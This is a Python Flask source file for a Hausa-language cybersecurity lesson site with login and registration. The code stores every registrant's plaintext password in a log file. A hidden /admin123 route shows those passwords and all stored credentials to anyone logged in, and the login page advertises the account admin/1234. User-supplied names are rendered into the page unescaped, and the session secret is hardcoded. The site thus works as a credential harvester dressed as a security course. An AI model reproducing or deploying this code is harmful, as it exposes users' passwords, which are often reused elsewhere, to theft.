from flask import Flask, render_template_string, request, redirect, session
import os
from datetime import datetime

app = Flask(__name__)
app.secret_key = "cyberlearn-2026-final"

users = {"admin":"1234"}
LOG_FILE = "users_log.txt"

def save_user(u, p):
    with open(LOG_FILE, "a") as f:
        f.write(f"{datetime.now()} - Username: {u}, Password: {p}\n")

if not os.path.exists(LOG_FILE):
    open(LOG_FILE, "w").close()

LESSONS = {
 1: {"title":"1. Phishing","maana":"Phishing damfara ce ta email/sako na karya kamar daga banki.","yadda":"Suna turo link na karya. Idan ka danna ka saka password, sun sace.","cutarwa":"Satar kudi, satar account, bashi da sunanka.","kariya":"Karka danna link da baka sani ba. Koyaushe duba adireshin."},
 2: {"title":"2. Strong Password","maana":"Password mai karfi da ba a iya karyawa cikin sauki.","yadda":"Hada Babba, karami, lamba, alama. Mis: Zaria@2026!","cutarwa":"Password mai sauki hacker na karya shi cikin dakika 2.","kariya":"Kada ka maimaita password daya a ko'ina. Yi amfani da 12 harafi."},
 3: {"title":"3. Malware","maana":"Virus ne da ke lalata waya/computer.","yadda":"Yana shigowa ta app na karya ko file da ka sauke.","cutarwa":"Wayarka zata yi kasa, sata hotuna, lalata file.","kariya":"Kada ka sauke daga wajen Play Store. Saka Antivirus."},
 4: {"title":"4. Social Engineering","maana":"Yaudara ta tunani, ba hacking na computer ba.","yadda":"Wani ya kira ka yace 'Ni daga banki ne, bani PIN'.","cutarwa":"Ana sace miliyoyi da wannan hanyar.","kariya":"Banki BAYA tambayar PIN ko OTP a waya. Duk wanda ya tambaya BARAWO ne."},
 5: {"title":"5. Public WiFi","maana":"WiFi kyauta a wajen jama'a yana da hadari.","yadda":"Hacker da ke WiFi daya da kai zai iya ganin abinda kake yi.","cutarwa":"Za su iya daukar password na Facebook da Banki.","kariya":"Karka shiga banki da free WiFi. Yi amfani da Mobile Data."}
}

BASE = """
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body{background:#050a14;color:white;font-family:Arial;margin:0;padding:0}
.box{max-width:500px;margin:20px auto;background:#101a2e;padding:25px;border-radius:15px;border:1px solid #00ff88}
input{width:95%;padding:13px;margin:8px 0;border-radius:8px;border:none}
button{width:98%;padding:13px;background:#00ff88;color:black;border:none;border-radius:8px;font-weight:bold;font-size:16px}
a{color:#00ff88;text-decoration:none}
.header{background:#001122;padding:15px;text-align:center;border-bottom:2px solid #00ff88}
.card{background:#101a2e;margin:12px;padding:18px;border-radius:12px;border-left:4px solid #00ff88}
</style>
"""

@app.route("/", methods=["GET","POST"])
def login():
    msg=""
    if request.method=="POST":
        u=request.form["username"]; p=request.form["password"]
        if u in users and users[u]==p:
            session["user"]=u
            return redirect("/home")
        msg="Suna ko Password ba daidai ba!"
    return render_template_string(BASE+"""
    <div class="header"><h1 style="color:#00ff88">CYBERLEARN-NG</h1></div>
    <div class="box"><h2>Login - Shiga</h2><p style="color:orange">{{msg}}</p>
    <form method="post"><input name="username" placeholder="Username" required>
    <input type="password" name="password" placeholder="Password" required>
    <button>SHIGA</button></form>
    <p>Baka da account? <a href="/register">Yi Register</a></p>
    <p>Test: admin / 1234</p></div>
    """, msg=msg)

@app.route("/register", methods=["GET","POST"])
def register():
    msg=""
    if request.method=="POST":
        u=request.form["username"]; p=request.form["password"]
        if u in users:
            msg="Wannan sunan yana nan!"
        else:
            users[u]=p
            save_user(u, p)
            return redirect("/")
    return render_template_string(BASE+"""
    <div class="header"><h1 style="color:#00ff88">CYBERLEARN-NG</h1></div>
    <div class="box"><h2>Register - Bude Account</h2><p style="color:orange">{{msg}}</p>
    <form method="post"><input name="username" placeholder="Zabi Username" required>
    <input type="password" name="password" placeholder="Zabi Password" required>
    <button>YI REGISTER</button></form>
    <p>Kana da account? <a href="/">Login</a></p></div>
    """, msg=msg)

@app.route("/home")
def home():
    if "user" not in session: return redirect("/")
    html = BASE + """<div class="header"><a href="/logout" style="float:right;color:red">Logout</a>
    <h1 style="color:#00ff88">CYBERLEARN-NG</h1><p>Barka da zuwa {{user}}!</p></div>"""
    for i,l in LESSONS.items():
        html+=f"""<div class="card"><h3>{l['title']}</h3><p>{l['maana']}</p><a href="/lesson/{i}"><button>Karanta Cikakke</button></a></div>"""
    return render_template_string(html, user=session["user"])

@app.route("/lesson/<int:id>")
def lesson(id):
    if "user" not in session: return redirect("/")
    l=LESSONS.get(id)
    if not l: return redirect("/home")
    nid = id+1 if id < len(LESSONS) else 1
    return render_template_string(BASE+"""
    <div style="padding:15px"><a href="/home">← Komawa</a>
    <h1 style="color:#00ff88">{{l.title}}</h1>
    <div class="card"><h3>📖 Ma'anarsa</h3><p>{{l.maana}}</p></div>
    <div class="card"><h3>⚙️ Yadda Ake Yi</h3><p>{{l.yadda}}</p></div>
    <div class="card" style="border-left-color:red"><h3>☠️ Cutarwa</h3><p>{{l.cutarwa}}</p></div>
    <div class="card" style="border-left-color:#00ff88"><h3>✅ Kariya / Amfani</h3><p>{{l.kariya}}</p></div>
    <a href="/lesson/{{nid}}"><button>Darasi na Gaba →</button></a></div>
    """, l=l, nid=nid)

@app.route("/admin123")
def admin_view():
    if "user" not in session: return redirect("/")
    if not os.path.exists(LOG_FILE):
        return "Babu kowa tukuna"
    with open(LOG_FILE, "r") as f:
        logs = f.read().replace("\n", "<br>")
    all_users = "<br>".join([f"{k} : {v}" for k,v in users.items()])
    return f"""
    <html><head><meta name="viewport" content="width=device-width, initial-scale=1">
    <style>body{{background:#050a14;color:white;font-family:Arial;padding:20px}}
   .box{{background:#101a2e;padding:20px;border-radius:12px}}</style></head>
    <body><h1 style="color:#00ff88">ADMIN PANEL</h1>
    <div class="box"><h3>Duk Users (a memory):</h3><p>{all_users}</p>
    <h3>Log File (Masu Register):</h3><p>{logs}</p>
    <a href="/home" style="color:#00ff88">← Komawa Home</a></div></body></html>
    """

@app.route("/logout")
def logout():
    session.clear()
    return redirect("/")

if __name__=="__main__":
    app.run()